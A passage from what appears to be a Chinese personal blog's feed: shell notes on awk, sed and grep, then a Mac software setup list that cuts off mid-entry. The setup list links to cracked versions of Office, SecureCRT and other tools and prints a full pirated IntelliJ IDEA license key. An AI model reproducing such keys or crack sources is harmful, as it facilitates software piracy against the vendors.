&lt;h3 id=&quot;2-awk使用特殊分隔符分隔列&quot;&gt;&lt;a href=&quot;#2-awk使用特殊分隔符分隔列&quot; class=&quot;headerlink&quot; title=&quot;2. awk使用特殊分隔符分隔列&quot;&gt;&lt;/a&gt;2. awk使用特殊分隔符分隔列&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;echo &amp;quot;192.168.102.134&amp;quot; | awk -F . &amp;#x27;&amp;#123;print $4&amp;#125;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;


&lt;h2 id=&quot;二、sed命令&quot;&gt;&lt;a href=&quot;#二、sed命令&quot; class=&quot;headerlink&quot; title=&quot;二、sed命令&quot;&gt;&lt;/a&gt;二、sed命令&lt;/h2&gt;&lt;h3 id=&quot;1-截取程序日志中某个时间范围内的文本&quot;&gt;&lt;a href=&quot;#1-截取程序日志中某个时间范围内的文本&quot; class=&quot;headerlink&quot; title=&quot;1. 截取程序日志中某个时间范围内的文本&quot;&gt;&lt;/a&gt;1. 截取程序日志中某个时间范围内的文本&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sed -n &amp;#x27;/^2015-05-14 15:32:30/,/^2015-05-14 16:12:09/p&amp;#x27; access_log &amp;gt; log.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;2-去除空白行的sed&quot;&gt;&lt;a href=&quot;#2-去除空白行的sed&quot; class=&quot;headerlink&quot; title=&quot;2. 去除空白行的sed&quot;&gt;&lt;/a&gt;2. 去除空白行的sed&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;SECRET=`sed &amp;#x27;/^$/d&amp;#x27; file.txt | head -1`&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;3-通过sed替换字特殊字符&quot;&gt;&lt;a href=&quot;#3-通过sed替换字特殊字符&quot; class=&quot;headerlink&quot; title=&quot;3. 通过sed替换字特殊字符&quot;&gt;&lt;/a&gt;3. 通过sed替换字特殊字符&lt;/h3&gt;&lt;p&gt;&lt;code&gt;echo &amp;quot;12,34,56&amp;quot; | sed &amp;#39;s/,/ /g&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;4-通过sed替换二者之间的字符串内容&quot;&gt;&lt;a href=&quot;#4-通过sed替换二者之间的字符串内容&quot; class=&quot;headerlink&quot; title=&quot;4. 通过sed替换二者之间的字符串内容&quot;&gt;&lt;/a&gt;4. 通过sed替换二者之间的字符串内容&lt;/h3&gt;&lt;p&gt;文本内容：&lt;/p&gt;
&lt;figure class=&quot;highlight xml&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;&lt;span class=&quot;name&quot;&gt;server&lt;/span&gt;   &lt;span class=&quot;attr&quot;&gt;id&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;film-web&amp;quot;&lt;/span&gt;   &lt;span class=&quot;attr&quot;&gt;address&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;127.0.0.1&amp;quot;&lt;/span&gt; &lt;span class=&quot;attr&quot;&gt;port&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&amp;quot;6881&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;tag&quot;&gt;&amp;lt;/&lt;span class=&quot;name&quot;&gt;server&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sed -n &amp;quot;s/\( *server.*port=\&amp;quot;\).*\(\&amp;quot;.*\)/\1abc\2/p&amp;quot; 1.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed -n &amp;quot;s/\( *server.*address=\&amp;quot;\).*\(\&amp;quot; *port\)/\1abc\2/p&amp;quot; 1.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：sed里，使用圆括号括起来的内容，可以看做是变量。使用\1和\2来输出。&lt;br&gt;&lt;strong&gt;参见&lt;/strong&gt;：&lt;a href=&quot;http://coolshell.cn/articles/9104.html&quot;&gt;http://coolshell.cn/articles/9104.html&lt;/a&gt; 圆括号匹配&lt;/p&gt;
&lt;h3 id=&quot;5-从替换开始匹配行到行尾或结束匹配行区间内替换内容&quot;&gt;&lt;a href=&quot;#5-从替换开始匹配行到行尾或结束匹配行区间内替换内容&quot; class=&quot;headerlink&quot; title=&quot;5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容&quot;&gt;&lt;/a&gt;5. 从替换开始匹配行到行尾或结束匹配行区间内替换内容&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;sed -i &amp;quot;/ *server *id=/,\$&amp;#123;s/\(\&amp;lt;watchdog-port&amp;gt;\).*\(&amp;lt;\/watchdog-port&amp;gt;\)/\18000\2/g;&amp;#125;&amp;quot; resin.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sed &amp;quot;/ *server *id=\&amp;quot;/,/&amp;lt;\/server&amp;gt;/&amp;#123;s/\(\&amp;lt;watchdog-port&amp;gt;\).*\(&amp;lt;\/watchdog-port&amp;gt;\)/\18888\2/g;&amp;#125;&amp;quot; resin.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：每个匹配前后都需要加/，见上面红色部分。$表示最后一行，不需要加/&lt;/p&gt;
&lt;h2 id=&quot;三、grep命令&quot;&gt;&lt;a href=&quot;#三、grep命令&quot; class=&quot;headerlink&quot; title=&quot;三、grep命令&quot;&gt;&lt;/a&gt;三、grep命令&lt;/h2&gt;&lt;h3 id=&quot;1-查找特定文件指定字符串&quot;&gt;&lt;a href=&quot;#1-查找特定文件指定字符串&quot; class=&quot;headerlink&quot; title=&quot;1. 查找特定文件指定字符串&quot;&gt;&lt;/a&gt;1. 查找特定文件指定字符串&lt;/h3&gt;&lt;p&gt;&lt;code&gt;grep &amp;quot;no object DCH for MIME type multipart/mixed&amp;quot; *.log &amp;gt; MIME.log&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;2-查找文本内容&quot;&gt;&lt;a href=&quot;#2-查找文本内容&quot; class=&quot;headerlink&quot; title=&quot;2. 查找文本内容&quot;&gt;&lt;/a&gt;2. 查找文本内容&lt;/h3&gt;&lt;p&gt;&lt;code&gt;grep -i -r --exclude=*.jar --exclude=*.log* noah .&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;3-查看tomcat日志特定内容&quot;&gt;&lt;a href=&quot;#3-查看tomcat日志特定内容&quot; class=&quot;headerlink&quot; title=&quot;3. 查看tomcat日志特定内容&quot;&gt;&lt;/a&gt;3. 查看tomcat日志特定内容&lt;/h3&gt;&lt;p&gt;&lt;code&gt;tail -f catalina.out | grep timecost | grep FamilyController | awk &amp;#39;&amp;#123;if($10 &amp;gt; 100) print $0&amp;#125;&amp;#39;&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;4-查看tomcat某天日志&quot;&gt;&lt;a href=&quot;#4-查看tomcat某天日志&quot; class=&quot;headerlink&quot; title=&quot;4. 查看tomcat某天日志&quot;&gt;&lt;/a&gt;4. 查看tomcat某天日志&lt;/h3&gt;&lt;p&gt;&lt;code&gt;tail -800000 catalina.out | grep 2014-06-30 &amp;gt; 2014-06-30.log&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&quot;5-记录统计&quot;&gt;&lt;a href=&quot;#5-记录统计&quot; class=&quot;headerlink&quot; title=&quot;5. 记录统计&quot;&gt;&lt;/a&gt;5. 记录统计&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;grep timecost file.txt | wc -l&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;ls | wc -l&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&quot;6-grep与或非&quot;&gt;&lt;a href=&quot;#6-grep与或非&quot; class=&quot;headerlink&quot; title=&quot;6. grep与或非&quot;&gt;&lt;/a&gt;6. grep与或非&lt;/h3&gt;&lt;h4 id=&quot;与操作&quot;&gt;&lt;a href=&quot;#与操作&quot; class=&quot;headerlink&quot; title=&quot;与操作&quot;&gt;&lt;/a&gt;与操作&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;grep -E &amp;#x27;pattern1.*pattern2&amp;#x27; file.txt # in that order&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;grep -E &amp;#x27;pattern1.*pattern2|pattern2.*pattern1&amp;#x27; file.txt # in any order&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;grep &amp;#x27;pattern1&amp;#x27; file.txt | grep &amp;#x27;pattern2&amp;#x27; # in any order&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;或操作&quot;&gt;&lt;a href=&quot;#或操作&quot; class=&quot;headerlink&quot; title=&quot;或操作&quot;&gt;&lt;/a&gt;或操作&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;grep &amp;quot;pattern1\|pattern2&amp;quot; file.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;grep -E &amp;quot;pattern1|pattern2&amp;quot; file.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;grep -e pattern1 -e pattern2 file.txt&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;egrep &amp;quot;pattern1|pattern2&amp;quot; file.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&quot;非操作&quot;&gt;&lt;a href=&quot;#非操作&quot; class=&quot;headerlink&quot; title=&quot;非操作&quot;&gt;&lt;/a&gt;非操作&lt;/h4&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;grep -v &lt;span class=&quot;string&quot;&gt;&amp;#x27;pattern1&amp;#x27;&lt;/span&gt; file.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;摘自：&lt;a href=&quot;http://www.shellhacks.com/en/Using-BASH-Grep-OR-Grep-AND-Grep-NOT-Operators&quot;&gt;Using BASH “Grep OR / Grep AND / Grep NOT” Operators&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;7-递归查询不包含指定内容的文件&quot;&gt;&lt;a href=&quot;#7-递归查询不包含指定内容的文件&quot; class=&quot;headerlink&quot; title=&quot;7. 递归查询不包含指定内容的文件&quot;&gt;&lt;/a&gt;7. 递归查询不包含指定内容的文件&lt;/h3&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;grep -irL &amp;quot;date:&amp;quot; file.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="工具软件" scheme="http://yeshaoting.cn/categories/%E5%B7%A5%E5%85%B7%E8%BD%AF%E4%BB%B6/"/>
    
    
    <category term="小记" scheme="http://yeshaoting.cn/tags/%E5%B0%8F%E8%AE%B0/"/>
    
    <category term="命令" scheme="http://yeshaoting.cn/tags/%E5%91%BD%E4%BB%A4/"/>
    
    <category term="ubuntu" scheme="http://yeshaoting.cn/tags/ubuntu/"/>
    
  </entry>
  
  <entry>
    <title>Mac装机软件</title>
    <link href="http://yeshaoting.cn/article/mac/Mac%E8%A3%85%E6%9C%BA%E8%BD%AF%E4%BB%B6/"/>
    <id>http://yeshaoting.cn/article/mac/Mac%E8%A3%85%E6%9C%BA%E8%BD%AF%E4%BB%B6/</id>
    <published>2015-12-29T09:56:00.000Z</published>
    <updated>2021-07-01T04:25:31.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/mac.png" class="img-logo img-center" /><h2 id="一、应用软件"><a href="#一、应用软件" class="headerlink" title="一、应用软件"></a>一、应用软件</h2><h3 id="1-安装腾讯电脑管家"><a href="#1-安装腾讯电脑管家" class="headerlink" title="1. 安装腾讯电脑管家"></a>1. 安装腾讯电脑管家</h3><p>下载地址：<a href="http://mac.guanjia.qq.com/">http://mac.guanjia.qq.com/</a></p><p>软件下载列表：</p><ul><li>百度云同步盘</li><li>百度音乐</li><li>微信</li><li>QQ</li><li>Evernote</li><li>firefox</li><li>chrome</li><li>thunderbird</li><li>Foxmail</li><li>Thunder</li><li>VirtualBox</li><li>The Unarchiver</li><li>搜狗五笔</li><li>Sublime Text 2(需自行破解，参见：<a href="http://myroot.lofter.com/post/15197d_4e94e1">http://myroot.lofter.com/post/15197d_4e94e1</a>)</li><li>beyond compare(需自行破解)</li><li>AirDroid</li><li>iTerm</li><li>欧路词典</li><li>Snip</li></ul><span id="more"></span><h3 id="2-haroopad"><a href="#2-haroopad" class="headerlink" title="2. haroopad"></a>2. haroopad</h3><p>下载地址：<a href="http://pad.haroopress.com/user.html">http://pad.haroopress.com/user.html</a></p><h3 id="3-Office"><a href="#3-Office" class="headerlink" title="3. Office"></a>3. Office</h3><p>参见：<a href="http://www.macx.cn/thread-2166376-1-1.html">Microsoft Office 2016 for Mac (15.16) 正式版下载+破解</a></p><h3 id="4-MarkEditor"><a href="#4-MarkEditor" class="headerlink" title="4. MarkEditor"></a>4. MarkEditor</h3><p><a href="http://zrey.com/app/markeditor">http://zrey.com/app/markeditor</a></p><h3 id="5-ichm"><a href="#5-ichm" class="headerlink" title="5. ichm"></a>5. ichm</h3><p><a href="http://www.appinn.com/ichm/">iChm – CHM 阅读器[Mac]</a></p><h3 id="6-Stand-for-Mac"><a href="#6-Stand-for-Mac" class="headerlink" title="6. Stand for Mac"></a>6. Stand for Mac</h3><p>参见：<a href="http://www.appinn.com/stand-for-mac/">Stand for Mac – 定时提醒你去休息片刻[OS X]</a></p><h3 id="7-Go2Shell"><a href="#7-Go2Shell" class="headerlink" title="7. Go2Shell"></a>7. Go2Shell</h3><p>一个可以快速在当前目录打开Shell的工具,小巧,非常好用!<br><strong>注</strong>：XtraFinder可以代替。</p><p>参见：<a href="http://www.jianshu.com/p/88c6e68645c4">Mac必备神器之Go2Shell以及使用技巧</a></p><h3 id="8-XtraFinder"><a href="#8-XtraFinder" class="headerlink" title="8. XtraFinder"></a>8. XtraFinder</h3><p>10.9之前，Finder 没有多标签功能，第三方免费软件 XtraFinder 是我的必备软件之一，它除了提供类似 chrome 的多标签形式之外，还增加了一系列非常实用的功能：<br>1、向上按钮，可以直接返回上一级目录；<br>2、拷贝当前路径，有多种形式的路径可以选择，方便在各种环境下直接粘贴；<br>3、从当前位置启动：可以直接在当前路径下打开终端；<br>4、文件排序目录靠前：与 Windows 下的习惯保持一致，目录排在文件的最前端；<br>等等。</p><p>参见：<a href="http://www.macgg.com/archives/16303.html">Finder 功能扩展增强</a></p><h3 id="9-菜单栏日历"><a href="#9-菜单栏日历" class="headerlink" title="9. 菜单栏日历"></a>9. 菜单栏日历</h3><p>Day-O 是一款能替代 OS X 菜单栏原生日期时间显示的工具，界面风格与原生系统一样，点击还可以看到日历。<br><a href="http://www.appinn.com/day-o-for-os-x/">Day-O – 菜单栏日历[OS X]</a></p><p>官网：<a href="http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock">http://shauninman.com/archive/2011/10/20/day_o_mac_menu_bar_clock</a></p><p>另外一款：LunarCal Mac版<br><a href="http://www.pc6.com/mach/macdtime/">http://www.pc6.com/mach/macdtime/</a></p><h3 id="10-Cisco-AnyConnect-Secure-Mobility-Client"><a href="#10-Cisco-AnyConnect-Secure-Mobility-Client" class="headerlink" title="10. Cisco AnyConnect Secure Mobility Client"></a>10. Cisco AnyConnect Secure Mobility Client</h3><h3 id="11-vpn-amp-relay"><a href="#11-vpn-amp-relay" class="headerlink" title="11. vpn&amp;relay"></a>11. vpn&amp;relay</h3><p>mac软件：Tunnelblick<br>windows软件：OpenVPN</p><h3 id="12-tuxera-ntfs"><a href="#12-tuxera-ntfs" class="headerlink" title="12. tuxera ntfs"></a>12. tuxera ntfs</h3><p>自动加载ntfs格式移动设备，并支持读写。</p><h3 id="13-CheatSheet"><a href="#13-CheatSheet" class="headerlink" title="13. CheatSheet"></a>13. CheatSheet</h3><p>只需长按住 ⌘-command 键就可以显示当前程序的快捷键列表，仅支持 Mac 系统，就这么简单。</p><p>CheatSheet 能显示出几乎所有程序的快捷键列表，而列表中的功能，除了可以用快捷键操作，也是可以点的。如果你不喜欢用菜单，用 CheatSheet 来开启功能也是一个不错的办法。</p><p>参见：<a href="http://www.appinn.com/cheatsheet/">CheatSheet – 显示当前程序快捷键列表[Mac]</a></p><h3 id="14-HyperDock"><a href="#14-HyperDock" class="headerlink" title="14. HyperDock"></a>14. HyperDock</h3><p>HyperDock是一款可以让你的mac系统的任务栏浏览器图标能像win7系统那样显示当前已打开的网页略缩图，除此之外还可以平均分配画面，往左右一拉可以缺成两个平均画面，网上拉可以变成全屏幕。</p><p>HyperDock for Mac 1.5.2 中文破解版百度云盘直接下载：<a href="http://pan.baidu.com/s/1pJHv16F">http://pan.baidu.com/s/1pJHv16F</a></p><h3 id="15-NoSleep"><a href="#15-NoSleep" class="headerlink" title="15. NoSleep"></a>15. NoSleep</h3><p>一般情况下，在我们使用Macbook苹果笔记本的时候，只要将上盖阖上，电脑就会进入睡眠状态，这样运行的程序以及网络连接都会中断，直到睡眠被唤醒。<br>这里推荐一个插件NoSleep-1.4.0.dmg，可以自己控制合上盖子是否睡眠，是不是很赞！<br>修改nosleep的设置，勾选开机自动启动，空心图标表示合盖会睡眠，实心图标表示合盖不会睡眠，通过Enable NoSleep切换（也可以通过命令切换/usr/local/bin/NoSleepCtrl -s 1/0，再配合crontab就可以自动开启和关闭）</p><p>参见：<a href="http://www.appinn.com/nosleep/">NoSleep – 就是不休眠</a></p><h3 id="16-Clearview"><a href="#16-Clearview" class="headerlink" title="16. Clearview"></a>16. Clearview</h3><p>pdf和chm文件查看工具Clearview。<br>之前用过几款chm查看工具，如：ichm、xchm，有些chm会出现乱码问题。<br>但是，由于是全文内容加载，ClearView打开速度性能略差。</p><p>参见：<a href="http://www.sdifenzhou.com/clearview19.html">Clearview 1.9 Mac破解版</a></p><h3 id="x-更多应用软件"><a href="#x-更多应用软件" class="headerlink" title="x. 更多应用软件"></a>x. 更多应用软件</h3><p>参见：<a href="http://www.maczapp.com/zjbb">装机必备</a></p><h2 id="二、开发软件"><a href="#二、开发软件" class="headerlink" title="二、开发软件"></a>二、开发软件</h2><h3 id="1-git"><a href="#1-git" class="headerlink" title="1. git"></a>1. git</h3><p>图形工具：SourceTree</p><h3 id="2-jdk"><a href="#2-jdk" class="headerlink" title="2. jdk"></a>2. jdk</h3><h3 id="3-IDE"><a href="#3-IDE" class="headerlink" title="3. IDE"></a>3. IDE</h3><p>eclipse，STS</p><h4 id="IDEA"><a href="#IDEA" class="headerlink" title="IDEA"></a>IDEA</h4><p>破解码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C0FHYYCJ22-eyJsaWNlbnNlSWQiOiJDMEZIWVlDSjIyIiwibGljZW5zZWVOYW1lIjoid2VpIGh1YW5nIiwiYXNzaWduZWVOYW1lIjoiIiwiYXNzaWduZWVFbWFpbCI6IiIsImxpY2Vuc2VSZXN0cmljdGlvbiI6IiIsImNoZWNrQ29uY3VycmVudFVzZSI6ZmFsc2UsInByb2R1Y3RzIjpbeyJjb2RlIjoiSUkiLCJmYWxsYmFja0RhdGUiOiIyMDE2LTAyLTI1IiwicGFpZFVwVG8iOiIyMDE2LTAyLTI1In1dLCJoYXNoIjoiMjE2MDg1MS8wIiwiZ3JhY2VQZXJpb2REYXlzIjo3LCJhdXRvUHJvbG9uZ2F0ZWQiOmZhbHNlLCJpc0F1dG9Qcm9sb25nYXRlZCI6ZmFsc2V9-gpr4wd65mz5ExkwIKDiLKA6dGOPpOBBzZyKWUPaTpjUBIGAXFGFcId5tJPK2KeIUDOSbRKOONGm5tI8DL69MtiD22//QDeln5/UO5NBlyEUU352gX6smobx3aC19vjZHPpAkmhZYVyZEmOEAzhDZ8bO/q5u+anxHLRCmV931wBQm7SjnXAhFLRGOEAhOBnw+KxzZF4KCT5GgySK1V4Be7QCegjyvpOKtgVBpIgylnEiZKTMESXiXNNiKMaI+f9JT9ZjQgNlLvZQzXWl5GGNg/689wZ45OMZtg2HAoATh6f7VMWfbFMqZOu8xrTjEEwlt9KG8apzTdtM7lnSSZ4p5eQ==-MIIEPjCCAiagAwIBAgIBBTANBgkqhkiG9w0BAQsFADAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBMB4XDTE1MTEwMjA4MjE0OFoXDTE4MTEwMTA4MjE0OFowETEPMA0GA1UEAwwGcHJvZDN5MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxcQkq+zdxlR2mmRYBPzGbUNdMN6OaXiXzxIWtMEkrJMO/5oUfQJbLLuMSMK0QHFmaI37WShyxZcfRCidwXjot4zmNBKnlyHodDij/78TmVqFl8nOeD5+07B8VEaIu7c3E1N+e1doC6wht4I4+IEmtsPAdoaj5WCQVQbrI8KeT8M9VcBIWX7fD0fhexfg3ZRt0xqwMcXGNp3DdJHiO0rCdU+Itv7EmtnSVq9jBG1usMSFvMowR25mju2JcPFp1+I4ZI+FqgR8gyG8oiNDyNEoAbsR3lOpI7grUYSvkB/xVy/VoklPCK2h0f0GJxFjnye8NT1PAywoyl7RmiAVRE/EKwIDAQABo4GZMIGWMAkGA1UdEwQCMAAwHQYDVR0OBBYEFGEpG9oZGcfLMGNBkY7SgHiMGgTcMEgGA1UdIwRBMD+AFKOetkhnQhI2Qb1t4Lm0oFKLl/GzoRykGjAYMRYwFAYDVQQDDA1KZXRQcm9maWxlIENBggkA0myxg7KDeeEwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgWgMA0GCSqGSIb3DQEBCwUAA4ICAQC9WZuYgQedSuOc5TOUSrRigMw4/+wuC5EtZBfvdl4HT/8vzMW/oUlIP4YCvA0XKyBaCJ2iX+ZCDKoPfiYXiaSiH+HxAPV6J79vvouxKrWg2XV6ShFtPLP+0gPdGq3x9R3+kJbmAm8w+FOdlWqAfJrLvpzMGNeDU14YGXiZ9bVzmIQbwrBA+c/F4tlK/DV07dsNExihqFoibnqDiVNTGombaU2dDup2gwKdL81ua8EIcGNExHe82kjF4zwfadHk3bQVvbfdAwxcDy4xBjs3L4raPLU3yenSzr/OEur1+jfOxnQSmEcMXKXgrAQ9U55gwjcOFKrgOxEdek/Sk1VfOjvS+nuM4eyEruFMfaZHzoQiuw4IqgGc45ohFH0UUyjYcuFxxDSU9lMCv8qdHKm+wnPRb0l9l5vXsCBDuhAGYD6ss+Ga+aDY6f/qXZuUCEUOH3QUNbbCUlviSz6+GiRnt1kA9N2Qachl+2yBfaqUqr8h7Z2gsx5LcIf5kYNsqJ0GavXTVyWh7PYiKX4bs354ZQLUwwa/cG++2+wNWP+HtBhVxMRNTdVhSm38AknZlD+PTAsWGu9GyLmhti2EnVwGybSD2Dxmhxk3IPCkhKAK+pl0eWYGZWG3tJ9mZ7SowcXLWDFAk0lRJnKGFMTggrWjV8GYpw5bq23VmIqqDLgkNzuoog==</span><br></pre></td></tr></table></figure><p>参见：</p><ul><li><a href="http://hw1287789687.iteye.com/blog/2153894">IntelliJ IDEA 14 注册码</a></li><li><a href="http://inhu.net/intellij-idea-14-keygen.html">IntelliJ IDEA 14 在线注册机</a></li></ul><h3 id="4-maven"><a href="#4-maven" class="headerlink" title="4. maven"></a>4. maven</h3><h3 id="5-securecrt"><a href="#5-securecrt" class="headerlink" title="5. securecrt"></a>5. securecrt</h3><p>注册的主机配置路径：cd ~/Library/Application\ Support/VanDyke/SecureCRT/Config/Sessions/</p><p>参见：</p><ul><li><a href="http://bbs.feng.com/read-htm-tid-6939481.html">Mac下面的SecureCRT(附破解方案) 更新到最新的7.2</a></li><li>评论<a href="http://blog.csdn.net/skykingf/article/details/17450561">Mac下面的SecureCRT(附破解方案) 更新到最新的7.3.2</a></li></ul><h3 id="6-redis-desktop-manager"><a href="#6-redis-desktop-manager" class="headerlink" title="6. redis desktop manager"></a>6. redis desktop manager</h3><h3 id="7-mysql"><a href="#7-mysql" class="headerlink" title="7. mysql"></a>7. mysql</h3><p>下载：mysql-5.6.27-osx10.9-x86_64.dmg<br>正常安装，默认无密码。</p><p>更改mysql root密码：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 